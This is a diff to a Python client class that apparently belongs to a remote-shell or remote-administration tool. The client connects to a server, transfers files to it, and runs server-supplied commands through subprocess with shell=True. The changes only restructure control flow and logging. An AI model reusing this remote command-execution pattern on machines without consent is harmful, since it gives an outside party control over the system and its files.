@@ -233,7 +233,6 @@ class Client(object):
             self.socket = socket.socket()
         except Exception as e:
             logging.error(errors(e))
-            return
         return
 
     def socket_connect(self) -> None:
@@ -310,10 +309,10 @@ class Client(object):
             self.send(b'File Transferred Successfully')
             logging.info('Transferred {} to Server'.format(file_to_transfer))
         except Exception as e:
+            logging.info(errors(e))
             self.send(b'FILE_TRANSFER_DONE')
             self.receive()
             self.send(errors(e).encode())
-            logging.info(errors(e))
         return
 
     def receive_file(self, save_as) -> None:
@@ -508,11 +507,11 @@ class Client(object):
                         if newlines > 1:
                             process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                             self.send(json_dumps(['ERROR', process.stdout.read().decode()]))
-                        else:
-                            os.chdir(output.strip())
-                            self.send(json_dumps([os.getcwd()]))
-                    else:
-                        self.send(json_dumps(['ERROR', error]))
+                            continue
+                        os.chdir(output.strip())
+                        self.send(json_dumps([os.getcwd()]))
+                        continue
+                    self.send(json_dumps(['ERROR', error]))
                     continue
 
                 process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
